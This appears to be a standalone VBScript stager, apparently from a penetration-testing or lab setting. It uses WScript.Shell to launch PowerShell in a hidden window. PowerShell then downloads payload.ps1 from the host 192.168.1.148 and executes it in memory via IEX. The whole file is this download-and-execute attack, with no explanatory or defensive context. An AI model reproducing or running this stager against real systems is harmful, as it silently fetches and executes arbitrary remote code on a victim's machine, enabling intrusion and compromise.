Set shell = CreateObject("WScript.Shell")
command = "powershell -c ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.148/payload.ps1')"""
shell.Run command ,0, True
